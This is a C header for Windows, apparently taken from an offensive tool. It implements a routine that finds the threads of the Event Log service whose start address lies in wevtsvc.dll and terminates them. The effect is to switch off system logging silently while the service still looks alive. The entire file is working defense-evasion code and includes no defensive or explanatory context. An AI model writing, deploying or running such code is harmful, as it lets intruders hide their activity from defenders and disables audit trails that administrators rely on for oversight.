#pragma once

#include <windows.h>
#include <tlhelp32.h>
#include <strsafe.h>

// Inspired from http://www.rohitab.com/discuss/topic/36675-how-to-get-the-module-name-associated-with-a-thread/?p=10078697
BOOL Technique_2(DWORD dwEventLogPID) {

	printf("[*] Using Technique-2 for killing threads...\n");

	BOOL killStatus = FALSE;

	HANDLE hEvtSnapshot = NULL;
	HANDLE hEvtThread = NULL;

	THREADENTRY32 te32;
	te32.dwSize = sizeof(THREADENTRY32);
	te32.cntUsage = 0;

	MODULEENTRY32 me32;
	me32.dwSize = sizeof(MODULEENTRY32);
	me32.th32ModuleID = 1;

	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

	if ((hEvtSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, dwEventLogPID)) != INVALID_HANDLE_VALUE) {

		while (Thread32Next(hEvtSnapshot, &te32)) {

			if (te32.th32OwnerProcessID == dwEventLogPID) {
				hEvtThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME | THREAD_TERMINATE, FALSE, te32.th32ThreadID);

				if (hEvtThread != NULL) {

					HANDLE hNewThreadHandle;
					DWORD64 dwThreadStartAddr = 0;

					if (hNtdll != NULL) {

						typedef NTSTATUS(WINAPI* _NtQueryInfomationThread)(HANDLE, LONG, PVOID, ULONG, PULONG);

						_NtQueryInfomationThread NtQueryInformationThread;

						if ((NtQueryInformationThread = (_NtQueryInfomationThread)GetProcAddress(hNtdll, "NtQueryInformationThread"))) {

							HANDLE hPeusdoCurrentProcess = GetCurrentProcess();

							if (DuplicateHandle(hPeusdoCurrentProcess, hEvtThread, hPeusdoCurrentProcess, &hNewThreadHandle, THREAD_QUERY_INFORMATION, FALSE, 0)) {

								NtQueryInformationThread(hNewThreadHandle, 9, &dwThreadStartAddr, sizeof(DWORD64), NULL);
								CloseHandle(hNewThreadHandle);

							}

						}

					}

					char moduleName[MAX_PATH] = { 0 };
					size_t cbDest = MAX_PATH * sizeof(char);

					if (Module32First(hEvtSnapshot, &me32)) {

						if (dwThreadStartAddr >= (DWORD_PTR)me32.modBaseAddr && dwThreadStartAddr <= ((DWORD_PTR)me32.modBaseAddr + me32.modBaseSize)) {

							StringCbPrintfA(moduleName, cbDest, "%ws", me32.szExePath);

						}
						else {

							while (Module32Next(hEvtSnapshot, &me32)) {

								if (dwThreadStartAddr >= (DWORD_PTR)me32.modBaseAddr && dwThreadStartAddr <= ((DWORD_PTR)me32.modBaseAddr + me32.modBaseSize)) {

									StringCbPrintfA(moduleName, cbDest, "%ws", me32.szExePath);
									break;

								}

							}

						}

					}

					if (strstr(moduleName, "wevtsvc.dll")) {

						if (TerminateThread(hEvtThread, 0) == 0) {

							printf("[!] Thread %d is detected but kill failed. Error code is: %d\n", te32.th32ThreadID, GetLastError());

						}
						else {

							printf("[+] Thread %d is detected and successfully killed.\n", te32.th32ThreadID);

						}

					}

					CloseHandle(hEvtThread);

				}
				
			}

		}

	}

	CloseHandle(hEvtSnapshot);

	return killStatus;
}